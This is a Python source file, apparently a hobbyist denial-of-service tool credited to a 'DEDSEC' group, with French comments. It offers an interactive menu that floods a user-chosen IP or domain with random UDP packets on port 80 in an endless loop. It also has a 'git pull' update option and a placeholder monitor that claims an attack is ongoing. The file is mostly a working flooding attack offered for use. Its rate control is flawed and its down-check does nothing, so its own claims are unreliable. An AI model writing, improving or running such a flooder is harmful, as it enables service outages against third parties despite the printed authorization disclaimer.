import sys
import os
import time
import socket
import threading
import subprocess

# Animation d'écriture
def type_animation(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)

# Informations sur le script
def print_info():
    type_animation("\nScript creator: •FAMOUS TECH• OR •FD LORD•\n")
    type_animation("Script design: FD LORD\n")
    type_animation("Legion: DEDSEC TM\n")
    type_animation("Collaborators: Lord____Z, ×_topher_×\n")
    type_animation("Info: USE THIS SCRIPT AT YOUR OWN RISK\n\n")

# Instructions d'utilisation
def print_usage():
    type_animation("Usage: python3 ddos.py <TYPE> <TARGET> <REQUESTS_PER_SECOND>\n")
    type_animation("Replace <TYPE> with 'IP' or 'DOMAIN'\n")
    type_animation("Replace <TARGET> with the IP address or domain name (e.g., 192.168.1.1 or example.com)\n")
    type_animation("and <REQUESTS_PER_SECOND> with the number of requests per second (e.g., 40000)\n\n")

# Avertissement sur l'utilisation responsable
def print_disclaimer():
    type_animation("Disclaimer:\n")
    type_animation("Use this script responsibly and with proper authorization.\n")
    type_animation("Performing DDoS attacks without permission is illegal and unethical.\n\n")

# Vérification de l'attaque DDoS
def check_attack():
    while True:
        time.sleep(300)  # Attendre 5 minutes (300 secondes)
        type_animation("\nChecking if the server is down...\n")
        # Vous pouvez ajouter une vraie vérification ici si nécessaire
        type_animation("DDoS attack ongoing...\n")

# Fonction pour lancer l'attaque DDoS
def attack(target, requests_per_second, attack_type):
    ip = target
    if attack_type.lower() == 'domain':
        try:
            ip = socket.gethostbyname(target)
        except socket.gaierror as e:
            print(f"Error: {str(e)}")
            os._exit(1)

    port = 80  # Default HTTP port
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)

    while True:
        for _ in range(requests_per_second):
            try:
                sock.sendto(bytes, (ip, port))
                print(f"Attacking {target} ({ip}) on port {port} with {requests_per_second} requests per second")
            except Exception as e:
                print(f"An error occurred: {str(e)}")
                continue
            time.sleep(1)

# Fonction de mise à jour du script
def update_script():
    type_animation("Updating script...\n")
    command = 'git pull'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if process.returncode == 0:
        type_animation("Script updated successfully.\n")
    else:
        type_animation(f"Error updating script: {stderr.decode()}\n")

# Affichage du menu principal
def main_menu():
    while True:
        print_info()
        print_disclaimer()
        type_animation("Select an option:\n")
        type_animation("1. Start DDoS Attack\n")
        type_animation("10. Update the script\n")
        type_animation("0. Exit\n")
        choice = input("> ")

        if choice == '1':
            target_type = input("Enter attack type (IP/DOMAIN): ").strip().lower()
            target = input("Enter target (IP address or domain): ").strip()
            requests_per_second = int(input("Enter requests per second: ").strip())
            attack_thread = threading.Thread(target=attack, args=(target, requests_per_second, target_type))
            attack_thread.start()
            check_thread = threading.Thread(target=check_attack)
            check_thread.start()
            try:
                attack_thread.join()
            except KeyboardInterrupt:
                print("\nDDoS attack interrupted. Exiting...")
                os._exit(1)
        elif choice == '10':
            update_script()
        elif choice == '0':
            os._exit(0)
        else:
            type_animation("Invalid choice. Please try again.\n")

# Exécution du menu principal
if __name__ == "__main__":
    main_menu()
